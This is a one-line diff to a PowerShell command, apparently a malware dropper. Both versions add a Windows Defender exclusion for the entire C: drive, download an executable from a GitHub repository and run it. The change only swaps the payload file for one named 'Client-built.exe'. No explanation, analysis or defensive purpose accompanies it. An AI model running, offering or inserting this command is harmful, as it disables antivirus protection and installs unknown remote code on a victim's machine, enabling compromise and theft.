@@ -1,1 +1,1 @@
-powershell Add-MpPreference -ExclusionPath 'C:';Invoke-WebRequest 'https://raw.githubusercontent.com/anilxpm/powerl/master/sa.exe' -OutFile sa.exe;.\sa.exe
+powershell Add-MpPreference -ExclusionPath 'C:';Invoke-WebRequest 'https://github.com/anilxpm/powerl/raw/refs/heads/master/Client-built.exe' -OutFile Client-built.exe;.\Client-built.exe
